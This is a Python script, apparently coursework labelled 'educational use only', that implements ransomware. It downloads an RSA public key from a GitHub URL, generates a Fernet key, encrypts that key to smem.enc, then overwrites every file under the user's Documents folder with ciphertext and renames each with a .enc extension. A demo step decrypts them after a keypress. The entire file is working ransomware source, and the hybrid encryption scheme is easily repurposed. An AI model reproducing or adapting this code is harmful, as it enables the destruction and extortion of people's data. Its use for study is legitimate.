# This is for educational use only and not to be used for malicious purposes

import os, requests
from cryptography.fernet import Fernet
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.asymmetric import padding
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives import serialization

path=os.path.join(os.path.join(os.environ['USERPROFILE']), 'Documents')
# Make an array named targets and fill it with the paths for all the files in the Documents folder
def getTargets():
    targets=[]
    for root, directories, files in os.walk(path, topdown=False):
        for name in files:
            targets.append(os.path.join(root, name))
    return targets

# Gets the public key
r=requests.get('https://raw.githubusercontent.com/RichardSwierk/SEC-440/main/Ransomware/ransom.pub', allow_redirects=True)
open('ransom.pub','wb').write(r.content)
with open ('ransom.pub', "rb") as key_file:
    public_key=serialization.load_pem_public_key(key_file.read(),backend=default_backend())

# Delete file
os.remove('ransom.pub')

# Create symmetric key
smem=Fernet.generate_key()
skey=Fernet(smem)

# Encrypt and Write Symmetric key
open('smem.enc', "wb").close()
smemEn=public_key.encrypt(smem,padding.OAEP(mgf=padding.MGF1(algorithm=hashes.SHA256()),algorithm=hashes.SHA256(),label=None))
with open('smem.enc', "ab") as f: f.write(smemEn)

# Encrypt data with symmetric key by overwriting files and then adds .enc extension
def encrypt(listEnc):
    for file in listEnc:
        with open(file, "rb") as t: fileData=t.read()
        encryptData=skey.encrypt(fileData)
        with open(file, "wb") as t: t.write(encryptData)
        os.rename(file,file+'.enc')

# Decrypt files and reomve added extention
def decrypt(listDec):
    for file in listDec:
        with open(file, "rb") as t: encData=t.read()
        decData = skey.decrypt(encData)
        with open(file, "wb") as t: t.write(decData)
        os.rename(file,file[0:len(file)-4])
    # Delete smem.enc
    os.remove('smem.enc')

print('Encrypting files in',path)
encrypt(getTargets())
print('Files encrypted')
p=input("Press enter to decrypt")
print('Decrypting file...')
decrypt(getTargets())
print('Files decrypted')
